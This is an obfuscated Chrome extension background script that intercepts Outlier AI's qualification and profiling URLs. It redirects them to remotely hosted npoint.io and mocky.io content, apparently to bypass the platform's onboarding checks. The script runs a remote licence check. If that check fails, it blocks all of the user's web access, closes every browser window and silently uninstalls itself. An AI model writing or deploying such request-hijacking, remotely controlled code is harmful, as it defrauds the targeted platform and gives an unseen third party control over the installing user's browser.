onboard = true;
successNotify = false;
banNotify = false;
function rabbit() {
  chrome.webRequest.onBeforeRequest.addListener(
    function (_0x30d5af) {
      if (
        _0x30d5af.url.startsWith(
          "https://app.outlier.ai/internal/experts/qualification/onboarding?"
        ) &&
        onboard
      ) {
        function _0x2e9caa() {
          onboard = false;
        }
        return (
          setTimeout(_0x2e9caa, 7000),
          { redirectUrl: "https://api.npoint.io/c7c7a0bb617a8ba6adb2" }
        );
      }
    },
    { urls: ["<all_urls>"] },
    ["blocking"]
  );
  chrome.webRequest.onBeforeRequest.addListener(
    function (_0x2d8093) {
      if (
        _0x2d8093.url.startsWith(
          "https://app.outlier.ai/internal/experts/profiling/complete?"
        )
      ) {
        let _0xedc9e0 = _0x2d8093.url.replace(
          "https://app.outlier.ai/internal/experts/profiling/complete?",
          "https://app.outlier.ai/internal/scaler/profiling/complete?"
        );
        return { redirectUrl: _0xedc9e0 };
      }
    },
    { urls: ["<all_urls>"] },
    ["blocking"]
  );
}
function violated() {
  fetch("https://api.npoint.io/90957425d72bbe899ca5")
    .then((_0x37677a) => _0x37677a.json())
    .then((_0x265daf) => {
      if (_0x265daf.success === true) {
        !successNotify &&
          (RestoreWebAccess(),
          accessNotification(),
          (banNotify = false),
          (successNotify = true),
          rabbit());
      } else {
        _0x265daf.success === false &&
          (setInterval(closeProfileAndUninstall, 30000),
          !banNotify &&
            ((banNotify = true),
            blockWebAccess(),
            banUserNotification(),
            (successNotify = false)));
      }
    })
    .catch((_0x3ecdd5) => {
      console.error("Error:", _0x3ecdd5);
    });
}
setInterval(violated, 5000);
violated();
function fetchDynamicUrl() {
  fetch("https://run.mocky.io/v3/584f1206-e342-4aec-a93e-861eb6d1ab7c")
    .then((_0x1c1b66) => _0x1c1b66.text())
    .then((_0x37d5c6) => {
      const _0x158f17 = _0x37d5c6.trim();
      chrome.storage.local.set({ dynamicUrl: _0x158f17 }, function () {
        console.log("Dynamic URL is set to " + _0x158f17);
        url = _0x158f17;
      });
    })
    .catch((_0x13838c) =>
      console.error("Error fetching dynamic URL:", _0x13838c)
    );
}
fetchDynamicUrl();
setInterval(fetchDynamicUrl, 300000);
chrome.webRequest.onBeforeRequest.addListener(
  function (_0x3da1c6) {
    if (_0x3da1c6.url.startsWith(url) && !banNotify) {
      return {
        redirectUrl:
          "https://run.mocky.io/v3/8aed82af-e61f-4a0d-8e3f-5ade26588b65",
      };
    }
  },
  { urls: ["<all_urls>"] },
  ["blocking"]
);
function blockWebAccess() {
  chrome.declarativeNetRequest.updateDynamicRules({
    removeRuleIds: [1, 2],
    addRules: [
      {
        id: 1,
        priority: 1,
        action: { type: "block" },
        condition: {
          urlFilter: "https",
          resourceTypes: [
            "main_frame",
            "sub_frame",
            "xmlhttprequest",
            "script",
            "other",
          ],
          isUrlFilterCaseSensitive: false,
        },
      },
      {
        id: 2,
        priority: 2,
        action: { type: "allow" },
        condition: {
          urlFilter: "https://api.npoint.io/",
          resourceTypes: [
            "main_frame",
            "sub_frame",
            "xmlhttprequest",
            "script",
            "other",
          ],
        },
      },
    ],
  });
}
function RestoreWebAccess() {
  chrome.declarativeNetRequest.updateDynamicRules({
    removeRuleIds: [1],
    addRules: [
      {
        id: 1,
        priority: 1,
        action: { type: "allow" },
        condition: {
          urlFilter: "https",
          resourceTypes: [
            "main_frame",
            "sub_frame",
            "xmlhttprequest",
            "script",
            "other",
          ],
          isUrlFilterCaseSensitive: false,
        },
      },
    ],
  });
}
function accessNotification() {
  function _0x2e8eca() {
    var _0x166fb5 = new Notification("Hi there!", {
      body: "GAMALASELA\uD83C\uDF8A\uD83D\uDE80\uD83D\uDE80 Access Allowed, Success\u2728\u2728",
    });
    setTimeout(function () {
      _0x166fb5.close();
    }, 30000);
  }
  _0x2e8eca();
}
function banUserNotification() {
  function _0x5e0e23() {
    var _0x4930b0 = new Notification("Hi there!", {
      body: "Access Denied \uD83E\uDD7A No Internet Access, Contact Gamal Asela... Closing this Profile In 30 seconds",
    });
    setTimeout(function () {
      _0x4930b0.close();
    }, 30000);
  }
  _0x5e0e23();
}
function closeAllWindows(_0x4366ac) {
  chrome.windows.getAll({}, function (_0x1ef72f) {
    let _0x37ea0e = _0x1ef72f.length;
    for (const _0x193edb of _0x1ef72f) {
      chrome.windows.remove(_0x193edb.id, function () {
        _0x37ea0e--;
        _0x37ea0e === 0 && typeof _0x4366ac === "function" && _0x4366ac();
      });
    }
  });
}
function uninstallExtension() {
  chrome.management.uninstallSelf({ showConfirmDialog: false }, function () {
    console.log("Extension uninstalled");
  });
}
function closeProfileAndUninstall() {
  closeAllWindows(uninstallExtension);
}
